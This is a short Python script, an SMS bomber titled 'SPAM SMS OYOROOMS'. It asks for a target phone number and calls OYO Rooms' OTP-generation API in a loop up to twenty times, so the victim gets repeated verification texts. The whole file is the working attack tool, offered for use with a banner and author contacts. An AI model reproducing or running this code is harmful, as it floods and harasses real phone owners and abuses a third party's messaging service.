import requests, os

os.system('clear')
c=('\033[1;36m')
r=('\033[1;31m')
g=('\033[1;32m')
w=('\033[1;37m')
print("""%s
			 SPAM SMS OYOROOMS%s
 ,_     _‚
 |\\\___//|	%sAuthor: mrb-in%s
 |=6   6=|	%sContact: https://vk.com/mrb12in%s
 \=._Y_.=/	%sGithub: https://github.com/mrb-in%s
  )  `  (    ,	
 /       \  ((
 |       |   ))
/| |   | |\_//	%sSPECIAL THANKS TO: Mikhail Khromov%s
\| |._.| |/-`
 '"'   '"'
"""%(c,r,g,r,g,r,g,r,g,r,w,r))
i=int(0)
no=input("%sTarget number => %s"%(g,w))
while True:
	idk=('status')
	r=requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+no+'&country_code=+62')
	if str(idk) in str(r.text):
		print("[+] Сообщение отправлено")
	else:
		print("[-] Неизвестная ошибка")
		print("%s[!] Лимит превышен"%(r))
		break
	i+=1
	if i == 20:
		print("%s[!] Лимит превышен:)"%(r))
		break

